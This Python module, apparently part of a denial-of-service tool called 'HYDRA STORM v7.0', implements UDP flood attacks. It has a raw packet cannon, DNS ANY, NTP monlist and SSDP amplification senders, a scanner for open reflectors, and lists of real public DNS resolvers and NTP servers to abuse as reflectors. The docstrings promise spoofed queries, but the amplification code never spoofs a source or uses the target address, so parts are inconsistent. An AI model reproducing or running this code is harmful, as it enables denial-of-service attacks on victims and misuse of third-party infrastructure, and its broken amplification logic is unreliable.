"""
HYDRA STORM v7.0 — UDP Flood Vectors
Raw cannon + DNS/NTP/SSDP amplification.
Packets built with struct — no external deps required.
"""

import socket
import struct
import random
import threading
import time
import os
from typing import List, Optional, Any, Callable


# ─── Known open DNS resolvers (public / documented) ───
DNS_RESOLVERS: List[str] = [
    "8.8.8.8", "8.8.4.4",                         # Google
    "1.1.1.1", "1.0.0.1",                         # Cloudflare
    "208.67.222.222", "208.67.220.220",            # OpenDNS
    "9.9.9.9", "149.112.112.112",                  # Quad9
    "64.6.64.6", "64.6.65.6",                     # Verisign
    "77.88.8.8", "77.88.8.1",                     # Yandex
    "94.140.14.14", "94.140.15.15",                # AdGuard
    "185.228.168.9", "185.228.169.9",              # CleanBrowsing
    "76.76.19.19", "76.223.122.150",               # Alternate DNS
    "198.101.242.72", "23.253.163.53",             # Alternate
    "176.103.130.130", "176.103.130.131",          # AdGuard Family
    "156.154.70.1", "156.154.71.1",                # Neustar
    "45.11.45.11",                                  # DNS.sb
    "185.235.81.1", "185.235.81.2",                # DNS for Family
    "91.239.100.100", "89.233.43.71",              # UncensoredDNS
    "74.82.42.42",                                  # Hurricane Electric
    "5.2.75.75", "5.9.49.12",                      # Freenom
    "80.80.80.80", "80.80.81.81",                  # Freenom World
    "216.146.35.35", "216.146.36.36",              # Dyn
    "37.235.1.174", "37.235.1.177",                # FreeDNS
    "84.200.69.80", "84.200.70.40",                # DNS.WATCH
    "8.26.56.26", "8.20.247.20",                   # Comodo Secure
    "195.46.39.39", "195.46.39.40",                # SafeDNS
    "81.218.119.11", "209.88.198.133",             # GreenTeam
    "199.85.126.10", "199.85.127.10",              # Norton
    "208.76.50.50", "208.76.51.51",                # SmartViper
]

# ─── Known NTP servers (stratum 1/2, public pool) ───
NTP_SERVERS: List[str] = [
    "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
    "time.google.com", "time1.google.com", "time2.google.com",
    "time.cloudflare.com",
    "time.windows.com", "time.nist.gov",
    "ntp.ubuntu.com",
    "time.apple.com", "time.euro.apple.com", "time.asia.apple.com",
    "clock.xinu.tv",
    "ntp1.hetzner.de", "ntp2.hetzner.de", "ntp3.hetzner.de",
    "0.north-america.pool.ntp.org", "1.north-america.pool.ntp.org",
    "0.europe.pool.ntp.org", "1.europe.pool.ntp.org",
    "0.asia.pool.ntp.org", "1.asia.pool.ntp.org",
    "0.oceania.pool.ntp.org", "1.oceania.pool.ntp.org",
    "0.south-america.pool.ntp.org",
    "0.africa.pool.ntp.org",
    "ntp.ripe.net",
    "ntp.se", "ntp1.sp.se", "ntp2.sp.se",
    "time.fu-berlin.de",
    "ptbtime1.ptb.de", "ptbtime2.ptb.de", "ptbtime3.ptb.de",
    "ntp.nict.jp",
    "ntp.shoa.cl",
    "ntp.lcf.bg",
    "ntp0.as34288.net", "ntp1.as34288.net",
    "rustime01.rus.uni-stuttgart.de",
    "time.ien.it",
    "ntp.metas.ch",
    "time.kfki.hu",
    "ntp.atomki.mta.hu",
    "time.esa.int",
    "ntp.fizyka.umk.pl",
    "ntp.tuxfamily.net",
    "ntp.nic.cz",
    "time.ufe.cz",
    "ntp.i2t.ehu.eus",
]

# ─── SSDP/UPnP endpoints ───
SSDP_TARGETS: List[str] = [
    # SSDP multicast and common gateway ranges
    "239.255.255.250",
    # Random residential gateway IPs get populated by discover_reflectors
]


def _resolve_if_hostname(host: str) -> str:
    """Resolve hostname to IP, passthrough if already IP."""
    try:
        socket.inet_aton(host)
        return host
    except OSError:
        try:
            return socket.gethostbyname(host)
        except socket.gaierror:
            return host


# ============================================================
#  DNS Packet Builder (no dnspython needed)
# ============================================================
def _build_dns_query(domain: str, qtype: int = 255) -> bytes:
    """
    Hand-craft a DNS query packet.
    qtype=255 is ANY — maximum amplification factor.
    """
    txn_id = random.randint(0, 0xFFFF)
    flags = 0x0100   # Standard query, recursion desired
    qdcount = 1
    header = struct.pack("!HHHHHH", txn_id, flags, qdcount, 0, 0, 0)

    # Encode QNAME
    qname = b""
    for label in domain.split("."):
        encoded = label.encode("ascii")
        qname += struct.pack("!B", len(encoded)) + encoded
    qname += b"\x00"

    # QTYPE + QCLASS (IN)
    question = struct.pack("!HH", qtype, 1)
    return header + qname + question


# ============================================================
#  NTP Packet Builder
# ============================================================
def _build_ntp_monlist() -> bytes:
    """
    Build NTP MON_GETLIST_1 (mode 7) request.
    This triggers the monlist response — huge amplification.
    """
    # NTP control message: version=2, mode=7 (private)
    # Implementation=0, Request code=42 (MON_GETLIST_1)
    packet = bytearray(48)
    # LI=0, VN=2, Mode=7 → byte: 0x17
    packet[0] = 0x17
    # Response bit=0, More=0, Sequence=0, Implementation=3
    packet[1] = 0x03
    # Request code: 42 (MON_GETLIST_1)
    packet[2] = 0x2A
    return bytes(packet)


# ============================================================
#  SSDP M-SEARCH Builder
# ============================================================
def _build_ssdp_msearch() -> bytes:
    """Build SSDP M-SEARCH discovery request."""
    return (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: ssdp:all\r\n"
        "USER-AGENT: UPnP/1.0\r\n"
        "\r\n"
    ).encode()


# ============================================================
#  UDP Cannon — Raw Brute Force
# ============================================================
class UDPCannon:
    """
    Firehose of randomized UDP packets.
    Pre-generates 100 payload variants, fat send buffer (128KB).
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        payload_size: int = 1024,
        cached_count: int = 100,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.payloads: List[bytes] = [
            os.urandom(random.randint(payload_size // 2, payload_size * 2))
            for _ in range(cached_count)
        ]

    def fire(self, stop_event: threading.Event) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
            sock.setblocking(False)
        except OSError:
            self.metrics.err()
            return

        target = (self.target_ip, self.port)
        payloads = self.payloads

        try:
            while not stop_event.is_set():
                for payload in payloads:
                    if stop_event.is_set():
                        break
                    try:
                        sock.sendto(payload, target)
                        self.metrics.hit(len(payload))
                    except BlockingIOError:
                        pass
                    except OSError:
                        self.metrics.err()
        finally:
            try:
                sock.close()
            except OSError:
                pass


# ============================================================
#  DNS Amplification
# ============================================================
class DNSAmplification:
    """
    Sends spoofed DNS ANY queries to open resolvers.
    The resolvers blast their enormous responses at the target.
    Amplification factor: ~28-54x.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        resolvers: Optional[List[str]] = None,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.resolvers = resolvers if resolvers else DNS_RESOLVERS.copy()
        # Pre-build the query packet
        self.query = _build_dns_query(domain, qtype=255)

    def fire(self, stop_event: threading.Event) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
            sock.setblocking(False)
        except OSError:
            self.metrics.err()
            return

        resolvers = self.resolvers
        query = self.query

        try:
            while not stop_event.is_set():
                for resolver in resolvers:
                    if stop_event.is_set():
                        break
                    try:
                        resolved = _resolve_if_hostname(resolver)
                        sock.sendto(query, (resolved, 53))
                        self.metrics.hit(len(query))
                    except BlockingIOError:
                        pass
                    except OSError:
                        self.metrics.err()
        finally:
            try:
                sock.close()
            except OSError:
                pass


# ============================================================
#  NTP Amplification
# ============================================================
class NTPAmplification:
    """
    Sends NTP monlist requests to NTP servers.
    They respond with traffic logs — massive amplification (~556x).
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        ntp_servers: Optional[List[str]] = None,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.servers = ntp_servers if ntp_servers else NTP_SERVERS.copy()
        self.packet = _build_ntp_monlist()

    def fire(self, stop_event: threading.Event) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
            sock.setblocking(False)
        except OSError:
            self.metrics.err()
            return

        servers = self.servers
        packet = self.packet

        try:
            while not stop_event.is_set():
                for server in servers:
                    if stop_event.is_set():
                        break
                    try:
                        resolved = _resolve_if_hostname(server)
                        sock.sendto(packet, (resolved, 123))
                        self.metrics.hit(len(packet))
                    except BlockingIOError:
                        pass
                    except OSError:
                        self.metrics.err()
        finally:
            try:
                sock.close()
            except OSError:
                pass


# ============================================================
#  SSDP Amplification
# ============================================================
class SSDPAmplification:
    """
    Sends M-SEARCH to SSDP endpoints on port 1900.
    UPnP devices respond with service descriptions — decent amplification (~30x).
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        ssdp_targets: Optional[List[str]] = None,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.targets = ssdp_targets if ssdp_targets else SSDP_TARGETS.copy()
        self.packet = _build_ssdp_msearch()

    def fire(self, stop_event: threading.Event) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
            sock.setblocking(False)
        except OSError:
            self.metrics.err()
            return

        targets = self.targets
        packet = self.packet

        try:
            while not stop_event.is_set():
                for target in targets:
                    if stop_event.is_set():
                        break
                    try:
                        resolved = _resolve_if_hostname(target)
                        sock.sendto(packet, (resolved, 1900))
                        self.metrics.hit(len(packet))
                    except BlockingIOError:
                        pass
                    except OSError:
                        self.metrics.err()
        finally:
            try:
                sock.close()
            except OSError:
                pass


# ============================================================
#  Reflector Discovery Scanner
# ============================================================
def discover_reflectors(protocol: str, count: int = 50, timeout: float = 2.0) -> List[str]:
    """
    Actively scan for open DNS/NTP/SSDP reflectors.
    protocol: 'dns', 'ntp', or 'ssdp'
    Returns list of responding IPs.
    """
    found: List[str] = []
    lock = threading.Lock()

    if protocol == "dns":
        candidates = DNS_RESOLVERS.copy()
        probe_port = 53
        probe_data = _build_dns_query("google.com", qtype=255)
    elif protocol == "ntp":
        candidates = [_resolve_if_hostname(s) for s in NTP_SERVERS]
        probe_port = 123
        probe_data = _build_ntp_monlist()
    elif protocol == "ssdp":
        # Generate random IPs in common residential ranges for SSDP
        candidates = [
            f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
            for _ in range(200)
        ] + [
            f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
            for _ in range(100)
        ]
        probe_port = 1900
        probe_data = _build_ssdp_msearch()
    else:
        return []

    def _probe(target: str) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            resolved = _resolve_if_hostname(target)
            sock.sendto(probe_data, (resolved, probe_port))
            data, _ = sock.recvfrom(4096)
            if data and len(data) > len(probe_data):
                with lock:
                    if len(found) < count:
                        found.append(resolved)
            sock.close()
        except Exception:
            pass

    threads: List[threading.Thread] = []
    for candidate in candidates:
        if len(found) >= count:
            break
        t = threading.Thread(target=_probe, args=(candidate,), daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join(timeout=timeout + 1)

    return found[:count]
